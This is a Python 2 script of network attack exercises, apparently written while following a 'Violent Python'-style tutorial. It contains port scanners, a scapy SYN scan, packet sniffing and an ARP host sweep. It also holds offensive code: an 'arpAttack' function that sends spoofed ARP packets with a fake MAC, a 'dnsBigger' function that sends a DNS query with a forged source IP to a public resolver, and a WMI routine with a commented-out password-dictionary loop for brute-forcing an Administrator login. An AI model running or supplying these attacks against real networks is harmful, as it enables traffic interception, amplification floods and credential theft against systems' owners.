# -*- coding:utf-8 -*-
import sys

import nmap

if sys.version_info.major == 2:
    try:
        import optparse
        #import nmap
        import logging
        from socket import *
        from threading import Semaphore, Thread
        from scapy.all import *
        from scapy.layers.inet import IP, TCP


        def start():
            parser = optparse.OptionParser("usage %prog -H <target host> -p <target port>")
            parser.add_option("-H", dest="tarHost", type="string", help="specify target host")
            parser.add_option("-p", dest="tarPort", type="string", help="specify target port[s]")
            (options, args) = parser.parse_args()
            host = options.tarHost
            ports = str(options.tarPort).split('-')
            if (host is None) | (ports is None):
                print(parser.usage)
                exit(0)
            portScan(host, ports)

        screenLock = Semaphore(value=1)
        def connScan(host, port):
            try:
                conn = socket(AF_INET, SOCK_STREAM)
                conn.connect((host, port))
                # conn.send('ViolentPython\r\n')
                # rs = conn.recv(100)
                # screenLock.acquire()
                conn.close()
                print("[+] %d/tcp open"%port)
            except:
                # screenLock.acquire()
                print("[+] %d/tcp closed"%port)
            finally:
                # screenLock.release()
               pass

        def portScan(host, tarPorts):
            try:
                ip = gethostbyname(host)
            except:
                print("Unknown host")
                exit(0)
            try:
                name = gethostbyaddr(ip)
                print("Scan Results For: "+name[0])
            except:
                print("Scan Results For: " + ip)
            setdefaulttimeout(1)
            for tarPort in range(int(tarPorts[0]), int(tarPorts[1])):
                # t = Thread(target=connScan, args=(host, tarPort))
                # t.start()
                connScan(host, tarPort)

        def nmapScan(host, port):
            nmScan = nmap.PortScanner()
            nmScan.scan(host, port)
            state = nmScan[host]['tcp'][int(port)]['state']
            print("[+] "+host+"tcp/"+port+" "+state)


        def te4():
            #logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

            dst_ip = "127.0.0.1"
            src_port = RandShort()
            dst_port = 8088

            resp = sr1(IP(dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="S"), timeout=1)

            if resp:

                return resp.listname()
            else:
                return "close"

        def testTTL(pkt):
            try:
                if pkt.haslayer(IP):
                    ipsrc = pkt.getlayer(IP).src
                    ttl = str(pkt.ttl)
                    print('[+] Received From: ')
            except:
                pass

        def main():
            sniff(prn=testTTL, store=0)


        if __name__ == "__main__":
            dst_ip = "192.168.1.200"
            src_port = RandShort()
            dst_port = 80

            tcp_connect_scan_resp = sr1(IP(dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="S"), timeout=10)
            tcp_connect_scan_resp.show()
            if (str(type(tcp_connect_scan_resp)) == ""):
                print("Closed")
            elif (tcp_connect_scan_resp.haslayer(TCP)):
                if (tcp_connect_scan_resp.getlayer(TCP).flags == 0x12):
                    send_rst = sr(IP(dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="AR"), timeout=10)
                    print("Open")
            elif (tcp_connect_scan_resp.getlayer(TCP).flags == 0x14):
                print("Closed")

        from scapy.all import *
        from scapy.layers.dns import DNS, DNSQR
        from scapy.layers.inet import IP, UDP, TCP
        from scapy.layers.l2 import Ether, ARP
        from socket import *
        import wmi


        def sys_version(ipaddress, user, password):
            try:
                conn = wmi.WMI(computer=ipaddress, user=user, password=password)
                print
                "password = %s" % password
            except:
                pass
                # for sys in conn.Win32_OperatingSystem():
                #     print "Version:%s" % sys.Caption.encode("UTF8"),"Vernum:%s" % sys.BuildNumber  #系统信息
                #     print sys.OSArchitecture.encode("UTF8")  # 系统的位数
                #     print sys.NumberOfProcesses  # 系统的进程数


        def prin(ans, unans):
            for send, rcv in ans:
                ListMACAddr = rcv.sprintf("%Ether.src%---%ARP.psrc%")
                print(ListMACAddr)


        def ipScan():
            arr = []
            IpScan = '10.1.1.1/24'
            try:
                ans, unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(pdst=IpScan), timeout=2)
                for send, rcv in ans:
                    ListMACAddr = rcv.sprintf("%Ether.src%---%ARP.psrc%")
                    ip = rcv.sprintf("%ARP.psrc%")
                    arr.append(ip)
                    print(ListMACAddr)
                ipAnalyse(arr)
            except Exception as e:
                print(e)


        def ipAnalyse(ips):
            for ip in ips:
                # try:
                #     ip = gethostbyname(ip)
                # except:
                #    print "%s Unknown Host."%ip
                try:
                    name = gethostbyaddr(ip)
                    print("%s Scan Results For: %s" % (ip, name[0]))
                except:
                    pass


        def arpAttack(argv):
            """
            ARP attack
            """
            attackIP = argv + "/24"
            print
            "Begin"
            p = srploop(Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(pdst=attackIP, psrc="10.1.1.2", hwsrc="00:66:66:66:66:66"),
                        timeout=2, count=4)
            print
            "end"


        def dnsBigger():
            a = IP(dst='8.8.8.8', src='192.168.1.200')  # 192.168.1.200 为伪造的源ip
            b = UDP(dport=53)
            c = DNS(id=1, qr=0, opcode=0, tc=0, rd=1, qdcount=1, ancount=0, nscount=0, arcount=0)
            c.qd = DNSQR(qname='www.qq.com', qtype=1, qclass=1)
            p = a / b / c
            send(p)

        # with open("pwd_dict.txt") as pwdFile:
        #     for pwd in pwdFile.readlines():#3389
        #         print "trying %s"%pwd
        #         sys_version(ipaddress="10.1.1.160", user="Administrator", password=pwd)
    except:
        pass


